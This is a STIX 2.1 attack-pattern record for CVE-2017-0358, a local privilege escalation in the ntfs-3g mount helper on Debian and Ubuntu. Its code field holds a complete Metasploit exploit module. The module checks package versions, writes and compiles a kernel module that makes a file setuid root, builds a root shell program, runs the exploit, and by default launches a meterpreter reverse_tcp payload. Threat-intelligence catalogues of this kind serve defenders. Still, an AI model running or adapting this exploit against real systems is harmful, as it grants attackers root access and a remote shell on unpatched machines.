{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--92732e68-014e-4fb7-b069-0ae8726923e2",
    "created": "2024-08-14T16:59:47.970371Z",
    "modified": "2024-08-14T16:59:47.970375Z",
    "name": "Debian/Ubuntu ntfs-3g Local Privilege Escalation",
    "description": " ntfs-3g mount helper in Ubuntu 16.04, 16.10, Debian 7, 8, and possibly 9 does not properly sanitize the environment when executing modprobe. This can be abused to load a kernel module and execute a binary payload as the root user.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/ntfs3g_priv_esc.rb",
            "external_id": "ntfs3g_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-0358"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.chromium.org/p/project-zero/issues/detail?id=1072"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super( update_info( info, {\n        'Name'          => 'Debian/Ubuntu ntfs-3g Local Privilege Escalation',\n        'Description'   => %q{\n          ntfs-3g mount helper in Ubuntu 16.04, 16.10, Debian 7, 8, and possibly 9 does not properly sanitize the environment when executing modprobe.\n          This can be abused to load a kernel module and execute a binary payload as the root user.\n        },\n        'License'       => MSF_LICENSE,\n        'Author'        =>\n          [\n            'jannh@google.com',                    # discovery\n            'h00die <mike@shorebreaksecurity.com>' # metasploit module\n          ],\n        'Platform'      => [ 'linux' ],\n        'Arch'          => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes'  => [ 'shell', 'meterpreter' ],\n        'References'    =>\n          [\n            [ 'CVE', '2017-0358' ],\n            [ 'EDB', '41356' ],\n            [ 'URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1072' ]\n          ],\n        'Targets'       =>\n          [\n            [ 'Linux x86',       { 'Arch' => ARCH_X86 } ],\n            [ 'Linux x64',       { 'Arch' => ARCH_X64 } ]\n          ],\n        'DefaultOptions' =>\n          {\n            'payload' => 'linux/x64/meterpreter/reverse_tcp',\n            'PrependFork' => true,\n            },\n        'DefaultTarget' => 1,\n        'DisclosureDate' => '2017-01-05',\n        'Privileged'     => true\n      }\n      ))\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  def check\n\n    # check if linux headers were installed on Debian (not ubuntu). The 'common' headers won't work.\n    def headers_installed?()\n      output = cmd_exec('dpkg -l | grep \\'^ii\\' | grep linux-headers.*[^common]{7}')\n      if output\n        if output.include?('linux-headers')\n          return true\n        else\n          print_error('Linux kernel headers not available, compiling will fail.')\n          return false\n        end\n      end\n      false\n    end\n\n    output = cmd_exec('dpkg -l ntfs-3g | grep \\'^ii\\'')\n    if output\n      if output.include?('1:2015.3.14AR.1-1build1') #Ubuntu 16.04 LTS\n        print_good('Vulnerable Ubuntu 16.04 detected')\n        CheckCode::Appears\n      elsif output.include?('1:2016.2.22AR.1-3') #Ubuntu 16.10\n        print_good('Vulnerable Ubuntu 16.10 detected')\n        CheckCode::Appears\n      elsif output.include?('1:2012.1.15AR.5-2.1+deb7u2') #Debian Wheezy, we also need linux-source installed\n        print_good('Vulnerable Debian 7 (wheezy) detected')\n        if headers_installed?()\n          CheckCode::Appears\n        else\n          CheckCode::Safe\n        end\n        CheckCode::Appears\n      elsif output.include?('1:2014.2.15AR.2-1+deb8u2') #Debian Jessie, we also need linux-source installed\n        print_good('Vulnerable Debian 8 (jessie) detected')\n        if headers_installed?()\n          CheckCode::Appears\n        else\n          CheckCode::Safe\n        end\n        CheckCode::Appears\n      else\n        print_error(\"Version installed not vulnerable: #{output}\")\n        CheckCode::Safe\n      end\n    else\n      print_error('ntfs-3g not installed')\n      CheckCode::Safe\n    end\n  end\n\n  def exploit\n    def upload_and_compile(filename, file_path, file_content, compile=nil)\n      rm_f \"#{file_path}\"\n      if not compile.nil?\n        rm_f \"#{file_path}.c\"\n        vprint_status(\"Writing #{filename} to #{file_path}.c\")\n        write_file(\"#{file_path}.c\", file_content)\n        register_file_for_cleanup(\"#{file_path}.c\")\n        output = cmd_exec(compile)\n        if output != ''\n          print_error(output)\n          fail_with(Failure::Unknown, \"#{filename} at #{file_path}.c failed to compile\")\n        end\n      else\n        vprint_status(\"Writing #{filename} to #{file_path}\")\n        write_file(file_path, file_content)\n      end\n      cmd_exec(\"chmod +x #{file_path}\");\n      register_file_for_cleanup(file_path)\n    end\n\n    # These are direct copies of the modules from EDB\n    rootmod = %q{\n      #include <linux/module.h>\n      #include <linux/kernel.h>\n      #include <linux/cred.h>\n      #include <linux/syscalls.h>\n      #include <linux/kallsyms.h>\n\n      static int suidfile_fd = -1;\n      module_param(suidfile_fd, int, 0);\n\n      static int __init init_rootmod(void) {\n        int (*sys_fchown_)(int fd, int uid, int gid);\n        int (*sys_fchmod_)(int fd, int mode);\n        const struct cred *kcred, *oldcred;\n\n        sys_fchown_ = (void*)kallsyms_lookup_name(\"sys_fchown\");\n        sys_fchmod_ = (void*)kallsyms_lookup_name(\"sys_fchmod\");\n\n        printk(KERN_INFO \"rootmod loading\\n\");\n        kcred = prepare_kernel_cred(NULL);\n        oldcred = override_creds(kcred);\n        sys_fchown_(suidfile_fd, 0, 0);\n        sys_fchmod_(suidfile_fd, 06755);\n        revert_creds(oldcred);\n        return -ELOOP; /* fake error because we don't actually want to end up with a loaded module */\n      }\n\n      static void __exit cleanup_rootmod(void) {}\n\n      module_init(init_rootmod);\n      module_exit(cleanup_rootmod);\n\n      MODULE_LICENSE(\"GPL v2\");\n    }\n\n    rootshell = %q{\n      #include <unistd.h>\n      #include <err.h>\n      #include <stdio.h>\n      #include <sys/types.h>\n\n      int main(void) {\n        if (setuid(0) || setgid(0))\n          err(1, \"setuid/setgid\");\n        fputs(\"we have root privs now...\\n\", stderr);\n        execl(\"/bin/bash\", \"bash\", NULL);\n        err(1, \"execl\");\n      }\n    }\n\n    # we moved sploit.c off since it was so big to the external sources folder\n    path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2017-0358', 'sploit.c')\n    fd = ::File.open( path, \"rb\")\n    sploit = fd.read(fd.stat.size)\n    fd.close\n\n    rootmod_filename = 'rootmod'\n    rootmod_path = \"#{datastore['WritableDir']}/#{rootmod_filename}\"\n    rootshell_filename = 'rootshell'\n    rootshell_path = \"#{datastore['WritableDir']}/#{rootshell_filename}\"\n    sploit_filename = 'sploit'\n    sploit_path = \"#{datastore['WritableDir']}/#{sploit_filename}\"\n    payload_filename = rand_text_alpha(8)\n    payload_path = \"#{datastore['WritableDir']}/#{payload_filename}\"\n\n    if check != CheckCode::Appears\n      fail_with(Failure::NotVulnerable, 'Target not vulnerable! punt!')\n    end\n\n    def has_prereqs?()\n      def check_gcc?()\n        gcc = cmd_exec('which gcc')\n        if gcc.include?('gcc')\n          vprint_good('gcc is installed')\n          return true\n        else\n          print_error('gcc is not installed.  Compiling will fail.')\n          return false\n        end\n      end\n\n      def check_make?()\n        make = cmd_exec('which make')\n        if make.include?('make')\n          vprint_good('make is installed')\n          return true\n        else\n          print_error('make is not installed.  Compiling will fail.')\n          return false\n        end\n      end\n\n      return check_make?() && check_gcc?()\n    end\n\n    if has_prereqs?()\n      vprint_status('Live compiling exploit on system')\n    else\n      fail_with(Failure::Unknown, 'make and gcc required on system to build exploit for kernel')\n    end\n\n    # make our substitutions so things are dynamic\n    rootshell.gsub!(/execl\\(\"\\/bin\\/bash\", \"bash\", NULL\\);/,\n               \"return execl(\\\"#{payload_path}\\\", \\\"\\\", NULL);\") #launch our payload, and do it in a return to not freeze the executable\n    print_status('Writing files to target')\n    cmd_exec(\"cd #{datastore['WritableDir']}\")\n\n    #write all the files and compile.  This is equivalent to the original compile.sh\n    #gcc -o rootshell rootshell.c -Wall\n    upload_and_compile('rootshell', rootshell_path, rootshell, \"gcc -o #{rootshell_filename} #{rootshell_filename}.c -Wall\")\n    #gcc -o sploit sploit.c -Wall -std=gnu99\n    upload_and_compile('sploit', sploit_path, sploit, \"gcc -o #{sploit_filename} #{sploit_filename}.c -Wall -std=gnu99\")\n    #make -C /lib/modules/$(uname -r)/build M=$(pwd) modules\n    upload_and_compile('rootmod', \"#{rootmod_path}.c\", rootmod, nil)\n    upload_and_compile('Makefile', \"#{datastore['WritableDir']}/Makefile\", 'obj-m := rootmod.o', nil)\n    cmd_exec('make -C /lib/modules/$(uname -r)/build M=$(pwd) modules')\n    upload_and_compile('payload', payload_path, generate_payload_exe)\n\n    #This is equivalent to the 2nd half of the compile.sh file\n    cmd_exec('mkdir -p depmod_tmp/lib/modules/$(uname -r)')\n    cmd_exec('cp rootmod.ko depmod_tmp/lib/modules/$(uname -r)/')\n    cmd_exec('/sbin/depmod -b depmod_tmp/')\n    cmd_exec('cp depmod_tmp/lib/modules/$(uname -r)/*.bin .')\n    cmd_exec('rm -rf depmod_tmp')\n\n    register_file_for_cleanup(\"#{rootmod_path}.ko\")\n    register_file_for_cleanup(\"#{rootmod_path}.mod.c\")\n    register_file_for_cleanup(\"#{rootmod_path}.mod.o\")\n    register_file_for_cleanup(\"#{rootmod_path}.o\")\n\n    # and here we go!\n    print_status('Starting execution of priv esc.')\n    output = cmd_exec(sploit_path)\n    unless session_created?\n      # this could also be output.include?('we have root privs now...'), however session_created handles some additional cases like elevation happened,\n      # but binary payload was caught, or NIPS shut down the callback etc.\n      vprint_error(output)\n    end\n  end\n\n  def on_new_session(session)\n    # if we don't /bin/bash here, our payload times out\n    # [*] Meterpreter session 2 opened (192.168.199.131:4444 -> 192.168.199.130:37022) at 2016-09-27 14:15:04 -0400\n    # [*] 192.168.199.130 - Meterpreter session 2 closed.  Reason: Died\n    session.shell_command_token('/bin/bash')\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-01-05",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}